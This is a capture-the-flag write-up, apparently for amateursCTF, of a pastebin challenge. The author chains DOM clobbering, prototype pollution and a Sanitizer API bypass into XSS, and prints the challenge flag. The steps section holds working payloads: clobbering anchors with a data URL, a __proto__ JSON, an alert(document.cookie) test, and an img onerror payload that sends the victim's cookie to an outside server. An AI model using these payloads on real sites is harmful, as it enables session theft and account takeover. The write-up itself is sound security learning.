
## Author: voxal

check out this pastebin! its a great way to store pieces of your sanity between ctfs.

---

# 1. Challenge overview and code review

My motivation for this challenge was to learn more about DOM XSS and bypassing sanitization methods. This was my real CTF challenge ever, and it felt kind of exciting to boot up my own Docker container for the first time ever.

The site itself is simple. It has Paste-bin like functionality, letting you pass user data to the application and then your data is going through a sanitizer. 

There are a lot of concepts from ES10, which was released in 2019. 



**The code**

```js 
const sanitizer = new Sanitizer(); // Using the Sanitizer(); constructor
document.getElementById("title").setHTML(decodeURIComponent(`title`), { sanitizer }); // Sanitizing user input and setting the title
```
The title element is being set with a .setHTML method, with the sanitizer constructor. What this basically does is take arbitrary user input and passes it through the sanitizer with a default configuration.
You can read more about it here: [sanitizer object](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer)

```js
class Debug {
	#sanitize; // Private variable sanitize

	// Consructor defaulting to true if no parameter are passed
	constructor(sanitize = true) {  
			this.#sanitize = sanitize // Setting the private variable to the parameter, which was passed
        }
                
        get sanitize() {
            return this.#sanitize;
        }
    }
```

The debug class is declaring a private sanitize variable and a constructor, where the sanitize is being defaulted to true. Then it has a simple getter function, which returns the value of sanitize.

```js       
async function loadBody() {
    let extension = null; // This is always null, so it's a point of interest

    // Executes if window.debug exists and extension is not falsy
    if (window.debug?.extension) {
	        let res = await fetch(window.debug?.extension.toString()); // Sets the res to the string value of the URL
	        extension = await res.json(); // Sets the extension to be the json, which was defined in the previous response of res
        }
```

The loadBody() function is an asynchronous function, which means it has to fulfill a promise when using the await keyword.
- A promise is a constructor of it's own, which takes two functions as arguments: resolve() and reject(). Resolving means the promise is successful and rejecting means it is not successful.
- The ? operator in  `if (window.debug?.extension) {}`  here is checking if the class Debug exists and checking if extension true.
- Then continues to use the [fetch api](https://www.javascripttutorial.net/javascript-fetch-api/) , which is a modern version of the XMLHttpRequest, which works by fulfilling a promise.
	- Does a GET request to the URL (fetches the value of debug.extension from the window) and waits until the request is fully completed.
	- Then assigns the JSON value of the response to the variable extension.

```js
const debug = Object.assign(new Debug(true), extension ?? { report: true });
let body = decodeURIComponent(`123abc`);
	if (debug.report) {
        const reportLink = document.createElement("a");
        reportLink.innerHTML = `Report ZZlREqPmH3J945xhNB0VF`;
        reportLink.href = `report/ZZlREqPmH3J945xhNB0VF`;
        reportLink.style.marginTop = "1rem";
        reportLink.style.display = "block"
        document.body.appendChild(reportLink)
    }
    if (debug.sanitize) {
	    document.getElementById("paste").setHTML(body, { sanitizer })
        } else {
	        document.getElementById("paste").innerHTML = body
		}
	}
            
	loadBody();
```

The debug variable is being assigned a Debug object with the properties of { sanitize: true } and an extension. 
- The ?? operator checks if the extension is null or undefined. If undefined, sets it to { report: true }. In other cases, sets it to the extension value.

The conditional is creating a report link if debug.report is true.
- Might be useful if we can control the extension value or the report value.

If debug.sanitize is true
- Sanitizes malicious input with [.setHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML) method. *This method is experimental and not supported by FireFox.*

If debug.sanitize is false
- Gets the same HTML element and uses that to set the body without sanitization.

# 2. Challenge background

Because it was a simple page, it had to be vulnerable to DOM XSS in someway. I tried looking for sinks and sources but the sanitizer was in my way of glory.

I tried looking for multiple ways to manipulate the code execution flow by changing either the extension variable or the changing the properties of the sanitizer. 
- To confirm that code execution flow was changes, the page had to remove the report link generation or I had to modify the sanitizing source itself.
- This was found to be possible because of a prototype pollution vulnerability.
- And prototype pollution was found to be possible because of a DOM Clobbering vulnerability.

These were still relatively new concepts to me, so the challenge took a little while.

**What is [DOM Clobbering?](https://medium.com/@shilpybanerjee/dom-clobbering-its-clobbering-time-f8dd5c8fbc4b)**

DOM Clobbering is a viable technique, when the website is reflecting user inputted HTML. If the page doesn't sanitize id and name attributes, it might be possible to control some HTML in the DOM.
- For example, you might have an object like `someObject`.
- Then it might call out to a variable like `variableName`.
- If you can, make an anchor tag containing an id
- Then create an another anchor tag with the same id, the name and a href. 

Example:
```html
<a id=someObject>
<a id=someObject name=variable href="http://attacker.com/malicious.js">
```

If the DOM changes the execution of flow in JavaScript, 
It might be possible to end up in a completely different situation, and widening the attack surface.

Based on our earlier code review, we can try to clobber the Object debug.extension with an href containing data URLs. 

By clobbering the object we can execute this conditional statement:
```js       
async function loadBody() {
    let extension = null;
    if (window.debug?.extension) {
	        let res = await fetch(window.debug?.extension.toString());
	        extension = await res.json();
        }
```


**What is [prototype pollution?](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)**

"Well, firstly it needs to be understood that everything in JavaScript is an object: functions, strings, arrays etc. JavaScript inheritance is based on prototypes. Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. 

For example, String.prototype has a built-in method toLowerCase(), which means all strings have the method toLowerCase() because it was inherited from the prototype.

You can even view the properties of an object by accessing objectname.\_\_proto\_\_ in most modern browsers or using the Object.getPrototypeOf(objectname).

The core concern with prototype pollution is that an attacker may attempt to manipulate an object's prototype. This can lead to unexpected behavior in the application, including overwriting properties or methods of objects that are used later in the codebase. This can result in security vulnerabilities, data corruption, or crashes."

If we can send arbitrary json data, we would be able to pollute the Object.prototype, which should enable us to overwrite { sanitize: true } to { sanitize: false }

**3. Steps taken**

1. Step (Clobbering)

To clobber the debug.extension, we have to set the title to the payload of:
```html
<a id=debug><a id=debug name=extension href='data:text/plain;,{ "report": false }'>
```

By inspecting the DOM, we can see that this was successful:
```html
<h1 id="title">
  <a id="debug"></a><a id="debug" name="extension" href="data:text/plain;,{ &quot;report&quot;: false }"></a>
</h1>
```

And to be extra sure: we send a `console.log(debug.extension)` command to the developer console and we can see the exact same value:
```html
<a id="debug" name="extension" href="data:text/plain;,{ &quot;report&quot;: false }">
```

2. Step (Polluting)
Because we have control of the extension, we can send a \_\_proto\_\_ statement, to pollute the Object.prototype.

We just have to send it json like:
```json
{ "__proto__": { "sanitize": false }}
```

After testing, we notice that because the sanitize property is private, it cannot be modified this way. Private variables aren't a part of the prototype chain. Basically it means, that it's not vulnerable to pollution.

But maybe we could send it just enough data to make the sanitize variable something else than true?

I'm not sure of the reason but it's doing something that causes the sanitize variable to be something else than true, thus making it past the sanitizer:
```json
{ "__proto__": {}}
```

At this point it is possible to send arbitrary tags and get XSS.

3. XSS!
First I'm testing if the XSS actually works by sending a payload, which makes a malformed image, which errors out and alert the cookie of the user
```html 
<img src=x onerror=alert(document.cookie)>
```

It works. The point of this challenge is to get the admin cookie, so I need to set up a web server. Then I'll send a query with the document.cookie in it.

Essentially I'm sending the same payload, but with a redirect to my server and sending the user cookie through a GET request.
```html
<img src=x onerror=document.location='http://webserver.com/?'+document.cookie;>
```

*Flag: amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}*

# 4. Lessons learned 

I learned two new techniques from this challenge: Prototype Pollution and DOM Clobbering. At first I just wanted to hone my skills on DOM XSS but I realized the fact that vulnerabilities are usually chained in some way.

On top of that, I learned new concepts from JavaScript and ES10, like ? and ?? operators, setHTML and sanitizer, private variables and how to read and understand JavaScript better. I even learnt more about asynchronous functions and promises.

An amazing challenge to learn and I'm glad I found this right now.

**5. Additional resources**

Javascript promise:
https://www.programiz.com/javascript/promise

Async and await in JavaScript:
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await
https://www.programiz.com/javascript/async-await

Sanitizer object:
https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer
https://blog.logrocket.com/what-you-need-know-inbuilt-browser-html-sanitization/

setHTML method:
https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML

